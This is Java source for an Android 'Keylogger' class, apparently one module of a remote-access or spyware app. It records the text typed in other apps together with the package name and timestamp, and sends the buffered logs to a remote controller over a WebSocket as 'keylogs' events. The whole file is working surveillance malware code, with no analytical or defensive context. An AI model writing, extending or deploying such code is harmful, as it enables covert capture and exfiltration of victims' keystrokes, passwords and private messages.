package com.xrc.system.features;

import android.content.Context;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.network.XRCWebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public class Keylogger {
    private static final String TAG = Constants.TAG + ":Keylog";
    private static Keylogger instance;
    private final Context ctx;
    private final List<String> buffer;
    private boolean enabled = false;

    private Keylogger(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.buffer = Collections.synchronizedList(new ArrayList<>());
    }

    public static synchronized Keylogger get(Context ctx) {
        if (instance == null) instance = new Keylogger(ctx);
        return instance;
    }

    public void enable() {
        enabled = true;
        Log.i(TAG, "Keylogger enabled");
    }

    public void disable() {
        enabled = false;
        Log.i(TAG, "Keylogger disabled");
    }

    public boolean isEnabled() {
        return enabled;
    }

    public void log(String text, String pkg) {
        if (!enabled || text == null || text.isEmpty()) return;
        synchronized (buffer) {
            buffer.add(System.currentTimeMillis() + "|" + pkg + "|" + text);
            if (buffer.size() > 5000) {
                buffer.subList(0, 1000).clear();
            }
        }
    }

    public void dumpAndSend() {
        new Thread(() -> {
            try {
                JSONArray arr = new JSONArray();
                synchronized (buffer) {
                    for (String entry : buffer) {
                        arr.put(entry);
                    }
                }
                JSONObject data = new JSONObject();
                data.put("logs", arr);
                XRCWebSocketClient.get(ctx).sendEvent("keylogs", data);
            } catch (JSONException e) {
                Log.e(TAG, "Dump failed", e);
            }
        }).start();
    }
}
